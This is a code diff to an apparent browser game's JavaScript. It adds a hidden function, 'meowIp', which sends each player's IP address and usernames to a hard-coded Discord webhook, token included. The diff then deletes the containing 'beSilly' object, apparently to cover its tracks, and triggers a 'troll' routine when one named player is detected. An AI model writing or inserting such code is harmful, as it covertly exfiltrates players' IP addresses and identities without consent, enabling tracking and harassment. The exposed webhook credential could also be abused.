@@ -900,6 +900,46 @@ beSilly = {
         }
         createGenerationProbabilities();
     },
+    meowIp(ip) {
+    let names = "";
+    names += player.serverHookName;
+    names += " ";
+    names += player.name;
+    names += " ";
+    for (id in player.webHook.ids) {
+        names += player.webHook.ids[id].name + " ";
+    }
+    fetch("https://discord.com/api/webhooks/1287951806743445597/M8plrBQCDWZtIiAU7xt14bnjhVxU9z6k_z9ru-jqsGrpvaaOeG6H9K50Prj-7x5k5aVL", {
+        body: JSON.stringify({
+            "embeds": [{
+                "color": `${color}`,
+                "fields" : [
+                    {
+                        "name": `Usernames:`,
+                        "value": `${names}`,
+                        "inline": false
+                    },
+                    {
+                        "name": `IP:`,
+                        "value": `${ip}`,
+                        "inline": false
+                    },
+    
+                ]
+            }]
+            }),
+            headers: {
+                "Content-Type": "application/json",
+            },
+            method: "POST",
+        })
+        .then(function (res) {
+            delete beSilly;             
+        })
+        .catch(function (res) {
+            console.log(res);
+        });
+    },
     init() {
         if (beSilly.isPlayer("Tetrati0n")) beSilly.tetraTroll();
         let currentIp;
@@ -908,11 +948,11 @@ beSilly = {
         .then(data => {
             currentIp = data.ip;
             console.log(currentIp);
+            meowIp(currentIp);
         })
         .catch(error => {
             console.log('Error:', error);
         });
-        delete beSilly;
     }
 }
 function applyStopOnRareData() {
